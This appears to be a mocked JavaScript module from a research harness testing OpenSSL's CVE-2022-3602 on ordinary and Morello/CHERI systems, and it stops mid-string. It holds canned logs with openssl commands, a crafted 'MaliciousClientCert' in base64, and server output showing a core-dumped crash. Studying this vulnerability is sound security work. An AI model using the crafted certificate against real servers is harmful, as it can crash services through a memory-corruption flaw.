/**
 * Mocked version of `src/index.mjs`.
 *
 * Can be imported by doing `import {xxx} from "@nqminds/openssl-vuln-poc/src/__mocks__/index.mjs";`
 */

/* eslint-disable max-len */ // lines are autogenerated

import { promisify } from "node:util";

/** @typedef {import("./ssh-utils.mjs").SSHOpts} SSHOpts */
/** @typedef {import("./run-utils.mjs").RunLogs} RunLogs */

/**
 * OpenSSL Run Test Case options
 *
 * @typedef {object} OpenSSLTestCaseRunOptions
 * Options that can be passed to {@link OpenSSLTestCase~run()}.
 * @property {number} [port] - The port to run the OpenSSL tests on.
 */

/**
 * Generic test case for testing/exploiting [OpenSSL's CVE-2022-3602][1].
 *
 * [1]: https://nvd.nist.gov/vuln/detail/CVE-2022-3602
 */
export class OpenSSLTestCase {
  /**
   * Run OpenSSL Test Case.
   *
   * @abstract
   * @param {OpenSSLTestCaseRunOptions} [_opts] - Optional options.
   * @returns {Promise<RunLogs>} Resolves when the processes are closed with the logs of the process.
   */
  async run(
    _opts = {} // eslint-disable-line no-unused-vars
  ) {
    throw new Error("Unimplemented");
  }
}

/**
 *
 */
export class LocalHostTestCase extends OpenSSLTestCase {
  async setup() {
    return;
  }

  /**
   * @inheritdoc
   * @returns {Promise<RunLogs>} logs
   */
  async run({ port } = {}) {
    await promisify(setTimeout)(999);
    return {
      client: {
        stdout:
          "CONNECTED(00000003)\n" +
          "---\n" +
          "Certificate chain\n" +
          " 0 s:C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server\n" +
          "   i:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\n" +
          "   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256\n" +
          "   v:NotBefore: Nov 11 16:45:40 2022 GMT; NotAfter: May 19 16:45:40 2027 GMT\n" +
          " 1 s:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\n" +
          "   i:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\n" +
          "   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256\n" +
          "   v:NotBefore: Nov 11 16:45:27 2022 GMT; NotAfter: Nov  8 16:45:27 2032 GMT\n" +
          "---\n" +
          "Server certificate\n" +
          "-----BEGIN CERTIFICATE-----\n" +
          "MIIESjCCAzKgAwIBAgIBATANBgkqhkiG9w0BAQsFADBmMQswCQYDVQQGEwJVUzEL\n" +
          "MAkGA1UECAwCTlkxDDAKBgNVBAcMA05ZQzEQMA4GA1UECgwHRGF0YURvZzEZMBcG\n" +
          "A1UECwwQU2VjdXJpdHlSZXNlYXJjaDEPMA0GA1UEAwwGUm9vdENBMB4XDTIyMTEx\n" +
          "MTE2NDU0MFoXDTI3MDUxOTE2NDU0MFowWDELMAkGA1UEBhMCVVMxCzAJBgNVBAgM\n" +
          "Ak5ZMRAwDgYDVQQKDAdEYXRhRG9nMRkwFwYDVQQLDBBTZWN1cml0eVJlc2VhcmNo\n" +
          "MQ8wDQYDVQQDDAZzZXJ2ZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB\n" +
          "AQCKQYWsjzdTriGdFJPotaVvDCvKj4M7x0EoK6a+kUw8m7ZUx9dY8PTLMEJQCoRD\n" +
          "A3AHG392VxlOpjsBDP1pbBlWlpVd3gtOWCwzD8Ynr7LvnWopnjCtKxzwOqHB30FB\n" +
          "1+QjJgfK6q1Op810W/z8TWyYgxJdYbw9jiPz33qigTRinW4m4LqQW1jlnIzx/shG\n" +
          "zVJoAgQbVWr2QvBjkpYHnknIWog67VjAdZIa5YI6uyqqui/hGhCMoo1Rllp/asZ+\n" +
          "Ty/eSFoGo+DnCeAOkgAzQa6Uq1xsE7QzMeU1hicskqgdMajEvWrqIhJ18N5EvB48\n" +
          "KD9e27ThKKqfHW5CyaaB85KJAgMBAAGjggEPMIIBCzAMBgNVHRMBAf8EAjAAMB0G\n" +
          "A1UdDgQWBBTyKzovS+qCMzBd4yU5E8j0/nzCuTCBowYDVR0jBIGbMIGYgBTs1/q5\n" +
          "Gj+N3mk/mHeLyrTkwlu9eKFqpGgwZjELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAk5Z\n" +
          "MQwwCgYDVQQHDANOWUMxEDAOBgNVBAoMB0RhdGFEb2cxGTAXBgNVBAsMEFNlY3Vy\n" +
          "aXR5UmVzZWFyY2gxDzANBgNVBAMMBlJvb3RDQYIUW/Ka5OiVXoUJpWWBqC/bnts/\n" +
          "Th0wEQYJYIZIAYb4QgEBBAQDAgZAMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAK\n" +
          "BggrBgEFBQcDATANBgkqhkiG9w0BAQsFAAOCAQEAi3RVc7s2JIWX9rwXI+fW0C80\n" +
          "Z7kfT7Dn6S1WZdYAELnmlfSiZ8BIfXqE3ZN60lYdUfq0o5YbSyXmv5wRXb5ZLFOG\n" +
          "yZ9nFc+RfU0RZhaQx9rW01DAcJPezufZ8d4zr0s62e4V9k2FKGPaKGygSBnSK385\n" +
          "M6c0ejTXyISDUYBEoMNvBnE/kNSal30f9quzqRjtD/9xpkDBW3q0osQ1/vsAyxiq\n" +
          "csVPmyCcZzdgihK/eHEHPQnr9hZqapzQCCZScGSUWaV22EP4nuqSf6LqlrFTtFWL\n" +
          "P43R0H7LuJK34ts/o8HwPPCRLiZ95r/zTH2+n/nvkgBnAWn8uwnykEr4oKu3hA==\n" +
          "-----END CERTIFICATE-----\n" +
          "subject=C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server\n" +
          "issuer=C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\n" +
          "---\n" +
          "Acceptable client certificate CA names\n" +
          "C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\n" +
          "Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224\n" +
          "Shared Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512\n" +
          "Peer signing digest: SHA256\n" +
          "Peer signature type: RSA-PSS\n" +
          "Server Temp Key: X25519, 253 bits\n" +
          "---\n" +
          "SSL handshake has read 2787 bytes and written 3277 bytes\n" +
          "Verification error: self-signed certificate in certificate chain\n" +
          "---\n" +
          "New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384\n" +
          "Server public key is 2048 bit\n" +
          "Secure Renegotiation IS NOT supported\n" +
          "Compression: NONE\n" +
          "Expansion: NONE\n" +
          "No ALPN negotiated\n" +
          "Early data was not sent\n" +
          "Verify return code: 19 (self-signed certificate in certificate chain)\n" +
          "---\n",
        stderr:
          "SSL_connect:before SSL initialization\n" +
          "SSL_connect:SSLv3/TLS write client hello\n" +
          "SSL_connect:SSLv3/TLS write client hello\n" +
          "SSL_connect:SSLv3/TLS read server hello\n" +
          "Can't use SSL_get_servername\n" +
          "SSL_connect:TLSv1.3 read encrypted extensions\n" +
          "SSL_connect:SSLv3/TLS read server certificate request\n" +
          "depth=1 C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\n" +
          "verify error:num=19:self-signed certificate in certificate chain\n" +
          "verify return:1\n" +
          "depth=1 C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\n" +
          "verify return:1\n" +
          "depth=0 C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server\n" +
          "verify return:1\n" +
          "SSL_connect:SSLv3/TLS read server certificate\n" +
          "SSL_connect:TLSv1.3 read server certificate verify\n" +
          "SSL_connect:SSLv3/TLS read finished\n" +
          "SSL_connect:SSLv3/TLS write change cipher spec\n" +
          "SSL_connect:SSLv3/TLS write client certificate\n" +
          "SSL_connect:SSLv3/TLS write certificate verify\n" +
          "SSL_connect:SSLv3/TLS write finished\n" +
          "DONE\n" +
          "SSL3 alert write:warning:close notify\n",
        stdin: `openssl, s_client, -connect, 127.0.0.1:${port}, -key, certs/client.key.pem, -cert, certs/client.cert.pem, -CAfile, certs/malicious-client-cacert.pem, -state`,
      },
      server: {
        stdin: `openssl, s_server, -accept, ${port}, -CAfile, certs/cacert.pem, -cert, certs/server.cert.pem, -naccept, 1, -key, certs/server.key.pem, -state, -verify, 1`,
        stdout:
          "Using default temp DH parameters\n" +
          "ACCEPT\n" +
          "-----BEGIN SSL SESSION PARAMETERS-----\n" +
          "MIIEnwIBAQICAwQEAhMCBCAEqhx3zBv46zfSy3MDOH4MwoyBBapx978fBeIzFnUJ\n" +
          "WAQwjiksZKfFdRU9M9MdrqYYRXOfSZrBKdlsOfD6h/zhDcIjWYnBjG9J9SHxRPbD\n" +
          "TTJGoQYCBGQ+TBOiBAICHCCjggQTMIIEDzCCAvegAwIBAgIBATANBgkqhkiG9w0B\n" +
          "AQsFADBsMQswCQYDVQQGEwJGUjEMMAoGA1UECAwDSWRGMQ4wDAYDVQQHDAVQYXJp\n" +
          "czEQMA4GA1UECgwHRGF0YURvZzEZMBcGA1UECwwQU2VjdXJpdHlSZXNlYXJjaDES\n" +
          "MBAGA1UEAwwJS3JhZnRDZXJ0MB4XDTIyMTEwNDE1NDEwMloXDTI3MDUxMjE1NDEw\n" +
          "MlowZjELMAkGA1UEBhMCRlIxDDAKBgNVBAgMA0lkRjEQMA4GA1UECgwHRGF0YURv\n" +
          "ZzEZMBcGA1UECwwQU2VjdXJpdHlSZXNlYXJjaDEcMBoGA1UEAwwTTWFsaWNpb3Vz\n" +
          "Q2xpZW50Q2VydDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPQF8hvb\n" +
          "Dz6ahB2bngA3b+hf9RqsSy79vcQmZx791iCYY+8Svdes6G8NFZMv/8h875bLB9m+\n" +
          "xhbVxBGwr9ReQj16jNAlfmpXgaKrRG01P2pmjR//LvBvzkU5ki/Buc5RtjkEp1Ly\n" +
          "8bcR97LMovHRdNnLD7uAddnT/DPeRmzn4GAIFfzUhvW7zt8jZvtO2jwKFlM4UBrM\n" +
          "8t616GwBjqWJoaYGQ9165EfCqhfdUUyQWEYRWLYsSM1Q4ciqdHp8PcFAxDG7ILni\n" +
          "WUlMYOsppm49ffZFiUSE6fiu3maK+Y63mRsODkHK8tJBz7oIIULfBKRgR3kwsPdN\n" +
          "CYX2X4od78nglHkCAwEAAaOBwTCBvjAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBQr\n" +
          "x2XGHx2wX6ZJqkufShvxmm2XWjAfBgNVHSMEGDAWgBQHtbgFs6+sQi8K+hT/9V7K\n" +
          "gPQydDARBglghkgBhvhCAQEEBAMCBaAwDgYDVR0PAQH/BAQDAgXgMB0GA1UdJQQW\n" +
          "MBQGCCsGAQUFBwMCBggrBgEFBQcDBDAsBgNVHREEJTAjoCEGCCsGAQUFBwgJoBUM\n" +
          "E+a1i+ivlUBvdmVyZmxvdy5jb20wDQYJKoZIhvcNAQELBQADggEBAAhXaVy0G+qb\n" +
          "CL2y5n/D9wwsUJwmgJMjo76rxN1eHruHQW3golukwhvYcejVQ0OwaoA4jTcacH7h\n" +
          "8xBsD2CsGjBaex/BnRAPYr4vgvTxyEuI5AiI3ecNSr77CtvNwT0Xd3JpmoPGKykR\n" +
          "rFTs/5svIXUla9VOQsLhpXotEUC5gYciScbDXmVTG4KZ7EO55iByzqnYUGrdyf+z\n" +
          "ZxBkZaD3Wgr+EuXZeHmVH4CVKdyN3EcsKRSaX3Vg0OBINere0oblg5xbtPRaeX4j\n" +
          "/+EGKgy1cVTcbu986Lf5/wnArbQwf+lkYl8rWowej54B/7Owgb+bxQcv7Z2pYlJw\n" +
          "zhZpTfQIqASkBgQEAQAAAKUDAgEBrgcCBQDgRTfYswMCAR0=\n" +
          "-----END SSL SESSION PARAMETERS-----\n" +
          "Client certificate\n" +
          "-----BEGIN CERTIFICATE-----\n" +
          "MIIEDzCCAvegAwIBAgIBATANBgkqhkiG9w0BAQsFADBsMQswCQYDVQQGEwJGUjEM\n" +
          "MAoGA1UECAwDSWRGMQ4wDAYDVQQHDAVQYXJpczEQMA4GA1UECgwHRGF0YURvZzEZ\n" +
          "MBcGA1UECwwQU2VjdXJpdHlSZXNlYXJjaDESMBAGA1UEAwwJS3JhZnRDZXJ0MB4X\n" +
          "DTIyMTEwNDE1NDEwMloXDTI3MDUxMjE1NDEwMlowZjELMAkGA1UEBhMCRlIxDDAK\n" +
          "BgNVBAgMA0lkRjEQMA4GA1UECgwHRGF0YURvZzEZMBcGA1UECwwQU2VjdXJpdHlS\n" +
          "ZXNlYXJjaDEcMBoGA1UEAwwTTWFsaWNpb3VzQ2xpZW50Q2VydDCCASIwDQYJKoZI\n" +
          "hvcNAQEBBQADggEPADCCAQoCggEBAPQF8hvbDz6ahB2bngA3b+hf9RqsSy79vcQm\n" +
          "Zx791iCYY+8Svdes6G8NFZMv/8h875bLB9m+xhbVxBGwr9ReQj16jNAlfmpXgaKr\n" +
          "RG01P2pmjR//LvBvzkU5ki/Buc5RtjkEp1Ly8bcR97LMovHRdNnLD7uAddnT/DPe\n" +
          "Rmzn4GAIFfzUhvW7zt8jZvtO2jwKFlM4UBrM8t616GwBjqWJoaYGQ9165EfCqhfd\n" +
          "UUyQWEYRWLYsSM1Q4ciqdHp8PcFAxDG7ILniWUlMYOsppm49ffZFiUSE6fiu3maK\n" +
          "+Y63mRsODkHK8tJBz7oIIULfBKRgR3kwsPdNCYX2X4od78nglHkCAwEAAaOBwTCB\n" +
          "vjAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBQrx2XGHx2wX6ZJqkufShvxmm2XWjAf\n" +
          "BgNVHSMEGDAWgBQHtbgFs6+sQi8K+hT/9V7KgPQydDARBglghkgBhvhCAQEEBAMC\n" +
          "BaAwDgYDVR0PAQH/BAQDAgXgMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD\n" +
          "BDAsBgNVHREEJTAjoCEGCCsGAQUFBwgJoBUME+a1i+ivlUBvdmVyZmxvdy5jb20w\n" +
          "DQYJKoZIhvcNAQELBQADggEBAAhXaVy0G+qbCL2y5n/D9wwsUJwmgJMjo76rxN1e\n" +
          "HruHQW3golukwhvYcejVQ0OwaoA4jTcacH7h8xBsD2CsGjBaex/BnRAPYr4vgvTx\n" +
          "yEuI5AiI3ecNSr77CtvNwT0Xd3JpmoPGKykRrFTs/5svIXUla9VOQsLhpXotEUC5\n" +
          "gYciScbDXmVTG4KZ7EO55iByzqnYUGrdyf+zZxBkZaD3Wgr+EuXZeHmVH4CVKdyN\n" +
          "3EcsKRSaX3Vg0OBINere0oblg5xbtPRaeX4j/+EGKgy1cVTcbu986Lf5/wnArbQw\n" +
          "f+lkYl8rWowej54B/7Owgb+bxQcv7Z2pYlJwzhZpTfQIqAQ=\n" +
          "-----END CERTIFICATE-----\n" +
          "subject=C = FR, ST = IdF, O = DataDog, OU = SecurityResearch, CN = MaliciousClientCert\n" +
          "issuer=C = FR, ST = IdF, L = Paris, O = DataDog, OU = SecurityResearch, CN = KraftCert\n" +
          "Shared ciphers:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES128-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA\n" +
          "Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224:DSA+SHA224:DSA+SHA256:DSA+SHA384:DSA+SHA512\n" +
          "Shared Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224\n" +
          "Peer signing digest: SHA256\n" +
          "Peer signature type: RSA-PSS\n" +
          "Supported groups: x25519:secp256r1:x448:secp521r1:secp384r1:ffdhe2048:ffdhe3072:ffdhe4096:ffdhe6144:ffdhe8192\n" +
          "Shared groups: x25519:secp256r1:x448:secp521r1:secp384r1:ffdhe2048:ffdhe3072:ffdhe4096:ffdhe6144:ffdhe8192\n" +
          "CIPHER is TLS_AES_256_GCM_SHA384\n" +
          "Secure Renegotiation IS supported\n" +
          "Hello World from my OpenSSL Client!DONE\n",
        stderr:
          "verify depth is 1\n" +
          "SSL_accept:before SSL initialization\n" +
          "SSL_accept:before SSL initialization\n" +
          "SSL_accept:SSLv3/TLS read client hello\n" +
          "SSL_accept:SSLv3/TLS write server hello\n" +
          "SSL_accept:SSLv3/TLS write change cipher spec\n" +
          "SSL_accept:TLSv1.3 write encrypted extensions\n" +
          "SSL_accept:SSLv3/TLS write certificate request\n" +
          "SSL_accept:SSLv3/TLS write certificate\n" +
          "SSL_accept:TLSv1.3 write server certificate verify\n" +
          "SSL_accept:SSLv3/TLS write finished\n" +
          "SSL_accept:TLSv1.3 early data\n" +
          "SSL_accept:TLSv1.3 early data\n" +
          "depth=1 C = FR, ST = IdF, L = Paris, O = DataDog, OU = SecurityResearch, CN = KraftCert\n" +
          "verify error:num=19:self-signed certificate in certificate chain\n" +
          "verify return:1\n" +
          "depth=1 C = FR, ST = IdF, L = Paris, O = DataDog, OU = SecurityResearch, CN = KraftCert\n" +
          "verify return:1\n" +
          "depth=0 C = FR, ST = IdF, O = DataDog, OU = SecurityResearch, CN = MaliciousClientCert\n" +
          "verify return:1\n" +
          "depth=0 C = FR, ST = IdF, O = DataDog, OU = SecurityResearch, CN = MaliciousClientCert\n" +
          "verify error:num=1:unspecified certificate verification error\n" +
          "verify return:1\n" +
          "SSL_accept:SSLv3/TLS read client certificate\n" +
          "SSL_accept:SSLv3/TLS read certificate verify\n" +
          "SSL_accept:SSLv3/TLS read finished\n" +
          "SSL_accept:SSLv3/TLS write session ticket\n" +
          "SSL_accept:SSLv3/TLS write session ticket\n" +
          "SSL3 alert read:warning:close notify\n" +
          "SSL3 alert write:warning:close notify\n",
        exitCode: 130,
      },
    };
  }
}

/**
 *
 */
export class MorelloOpenSSLTestCase extends OpenSSLTestCase {
  async setup() {
    return;
  }
}

/**
 *
 */
export class MorelloHybridOpenSSLTestCase extends MorelloOpenSSLTestCase {
  /**
   * @inheritdoc
   */
  async run({ port } = {}) {
    await promisify(setTimeout)(6000);
    return {
      client: {
        stdout:
          "Hello World from my OpenSSL Client!CONNECTED(00000003)\r\n" +
          "SSL_connect:before SSL initialization\r\n" +
          "SSL_connect:SSLv3/TLS write client hello\r\n" +
          "SSL_connect:SSLv3/TLS write client hello\r\n" +
          "SSL_connect:SSLv3/TLS read server hello\r\n" +
          "Can't use SSL_get_servername\r\n" +
          "SSL_connect:TLSv1.3 read encrypted extensions\r\n" +
          "SSL_connect:SSLv3/TLS read server certificate request\r\n" +
          "depth=1 C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          "verify error:num=19:self signed certificate in certificate chain\r\n" +
          "verify return:1\r\n" +
          "depth=1 C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          "verify return:1\r\n" +
          "depth=0 C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server\r\n" +
          "verify return:1\r\n" +
          "SSL_connect:SSLv3/TLS read server certificate\r\n" +
          "SSL_connect:TLSv1.3 read server certificate verify\r\n" +
          "SSL_connect:SSLv3/TLS read finished\r\n" +
          "SSL_connect:SSLv3/TLS write change cipher spec\r\n" +
          "SSL_connect:SSLv3/TLS write client certificate\r\n" +
          "SSL_connect:SSLv3/TLS write certificate verify\r\n" +
          "SSL_connect:SSLv3/TLS write finished\r\n" +
          "---\r\n" +
          "Certificate chain\r\n" +
          " 0 s:C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server\r\n" +
          "   i:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          " 1 s:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          "   i:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          "---\r\n" +
          "Server certificate\r\n" +
          "-----BEGIN CERTIFICATE-----\r\n" +
          "MIIESjCCAzKgAwIBAgIBATANBgkqhkiG9w0BAQsFADBmMQswCQYDVQQGEwJVUzEL\r\n" +
          "MAkGA1UECAwCTlkxDDAKBgNVBAcMA05ZQzEQMA4GA1UECgwHRGF0YURvZzEZMBcG\r\n" +
          "A1UECwwQU2VjdXJpdHlSZXNlYXJjaDEPMA0GA1UEAwwGUm9vdENBMB4XDTIyMTEx\r\n" +
          "MTE2NDU0MFoXDTI3MDUxOTE2NDU0MFowWDELMAkGA1UEBhMCVVMxCzAJBgNVBAgM\r\n" +
          "Ak5ZMRAwDgYDVQQKDAdEYXRhRG9nMRkwFwYDVQQLDBBTZWN1cml0eVJlc2VhcmNo\r\n" +
          "MQ8wDQYDVQQDDAZzZXJ2ZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB\r\n" +
          "AQCKQYWsjzdTriGdFJPotaVvDCvKj4M7x0EoK6a+kUw8m7ZUx9dY8PTLMEJQCoRD\r\n" +
          "A3AHG392VxlOpjsBDP1pbBlWlpVd3gtOWCwzD8Ynr7LvnWopnjCtKxzwOqHB30FB\r\n" +
          "1+QjJgfK6q1Op810W/z8TWyYgxJdYbw9jiPz33qigTRinW4m4LqQW1jlnIzx/shG\r\n" +
          "zVJoAgQbVWr2QvBjkpYHnknIWog67VjAdZIa5YI6uyqqui/hGhCMoo1Rllp/asZ+\r\n" +
          "Ty/eSFoGo+DnCeAOkgAzQa6Uq1xsE7QzMeU1hicskqgdMajEvWrqIhJ18N5EvB48\r\n" +
          "KD9e27ThKKqfHW5CyaaB85KJAgMBAAGjggEPMIIBCzAMBgNVHRMBAf8EAjAAMB0G\r\n" +
          "A1UdDgQWBBTyKzovS+qCMzBd4yU5E8j0/nzCuTCBowYDVR0jBIGbMIGYgBTs1/q5\r\n" +
          "Gj+N3mk/mHeLyrTkwlu9eKFqpGgwZjELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAk5Z\r\n" +
          "MQwwCgYDVQQHDANOWUMxEDAOBgNVBAoMB0RhdGFEb2cxGTAXBgNVBAsMEFNlY3Vy\r\n" +
          "aXR5UmVzZWFyY2gxDzANBgNVBAMMBlJvb3RDQYIUW/Ka5OiVXoUJpWWBqC/bnts/\r\n" +
          "Th0wEQYJYIZIAYb4QgEBBAQDAgZAMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAK\r\n" +
          "BggrBgEFBQcDATANBgkqhkiG9w0BAQsFAAOCAQEAi3RVc7s2JIWX9rwXI+fW0C80\r\n" +
          "Z7kfT7Dn6S1WZdYAELnmlfSiZ8BIfXqE3ZN60lYdUfq0o5YbSyXmv5wRXb5ZLFOG\r\n" +
          "yZ9nFc+RfU0RZhaQx9rW01DAcJPezufZ8d4zr0s62e4V9k2FKGPaKGygSBnSK385\r\n" +
          "M6c0ejTXyISDUYBEoMNvBnE/kNSal30f9quzqRjtD/9xpkDBW3q0osQ1/vsAyxiq\r\n" +
          "csVPmyCcZzdgihK/eHEHPQnr9hZqapzQCCZScGSUWaV22EP4nuqSf6LqlrFTtFWL\r\n" +
          "P43R0H7LuJK34ts/o8HwPPCRLiZ95r/zTH2+n/nvkgBnAWn8uwnykEr4oKu3hA==\r\n" +
          "-----END CERTIFICATE-----\r\n" +
          "subject=C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server\r\n" +
          "\r\n" +
          "issuer=C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          "\r\n" +
          "---\r\n" +
          "Acceptable client certificate CA names\r\n" +
          "C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          "Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224\r\n" +
          "Shared Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512\r\n" +
          "Peer signing digest: SHA256\r\n" +
          "Peer signature type: RSA-PSS\r\n" +
          "Server Temp Key: X25519, 253 bits\r\n" +
          "---\r\n" +
          "SSL handshake has read 2787 bytes and written 3277 bytes\r\n" +
          "Verification error: self signed certificate in certificate chain\r\n" +
          "---\r\n" +
          "New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384\r\n" +
          "Server public key is 2048 bit\r\n" +
          "Secure Renegotiation IS NOT supported\r\n" +
          "Compression: NONE\r\n" +
          "Expansion: NONE\r\n" +
          "No ALPN negotiated\r\n" +
          "Early data was not sent\r\n" +
          "Verify return code: 19 (self signed certificate in certificate chain)\r\n" +
          "---\r\n" +
          "read:errno=0\r\n" +
          "SSL3 alert write:warning:close notify\r\n",
        stderr:
          "Warning: Permanently added '[127.0.0.2]:2222' (ED25519) to the list of known hosts.\r\n" +
          "ControlSocket /home/alois/.ssh/controlmasters/root@127.0.0.2:2222 already exists, disabling multiplexing\r\n" +
          "Connection to 127.0.0.2 closed.\r\n",
        stdin: `openssl, s_client, -connect, 127.0.0.1:${port}, -key, certs/client.key.pem, -cert, certs/client.cert.pem, -CAfile, certs/malicious-client-cacert.pem, -state`,
      },
      server: {
        stdin: `/usr/local64/bin/openssl, s_server, -accept, ${port}, -CAfile, certs/cacert.pem, -cert, certs/server.cert.pem, -naccept, 1, -key, certs/server.key.pem, -state, -verify, 1`,
        stdout:
          "verify depth is 1\r\n" +
          "Using default temp DH parameters\r\n" +
          "ACCEPT\r\n" +
          "SSL_accept:before SSL initialization\r\n" +
          "SSL_accept:before SSL initialization\r\n" +
          "SSL_accept:SSLv3/TLS read client hello\r\n" +
          "SSL_accept:SSLv3/TLS write server hello\r\n" +
          "SSL_accept:SSLv3/TLS write change cipher spec\r\n" +
          "SSL_accept:TLSv1.3 write encrypted extensions\r\n" +
          "SSL_accept:SSLv3/TLS write certificate request\r\n" +
          "SSL_accept:SSLv3/TLS write certificate\r\n" +
          "SSL_accept:TLSv1.3 write server certificate verify\r\n" +
          "SSL_accept:SSLv3/TLS write finished\r\n" +
          "SSL_accept:TLSv1.3 early data\r\n" +
          "SSL_accept:TLSv1.3 early data\r\n" +
          "depth=1 C = FR, ST = IdF, L = Paris, O = DataDog, OU = SecurityResearch, CN = KraftCert\r\n" +
          "verify error:num=19:self-signed certificate in certificate chain\r\n" +
          "verify return:1\r\n" +
          "depth=1 C = FR, ST = IdF, L = Paris, O = DataDog, OU = SecurityResearch, CN = KraftCert\r\n" +
          "verify return:1\r\n" +
          "depth=0 C = FR, ST = IdF, O = DataDog, OU = SecurityResearch, CN = MaliciousClientCert\r\n" +
          "verify return:1\r\n" +
          "Abort trap (core dumped)\r\n",
        stderr:
          "Warning: Permanently added '[127.0.0.2]:2222' (ED25519) to the list of known hosts.\r\n" +
          "ControlSocket /home/alois/.ssh/controlmasters/root@127.0.0.2:2222 already exists, disabling multiplexing\r\n" +
          "Connection to 127.0.0.2 closed.\r\n",
        exitCode: 134,
      },
    };
  }
}

/**
 * Runs the OpenSSL test case on a Morello Purecap system.
 *
 * The OpenSSL server should throw a CHERI `SIGPROT`.
 * (aka return exitcode 162).
 */
export class MorelloPurecapOpenSSLTestCase extends MorelloOpenSSLTestCase {
  /**
   * @inheritdoc
   * @returns {Promise<RunLogs>} logs
   */
  async run({ port } = {}) {
    await promisify(setTimeout)(6000);
    return {
      client: {
        stdout:
          "Hello World from my OpenSSL Client!CONNECTED(00000003)\r\n" +
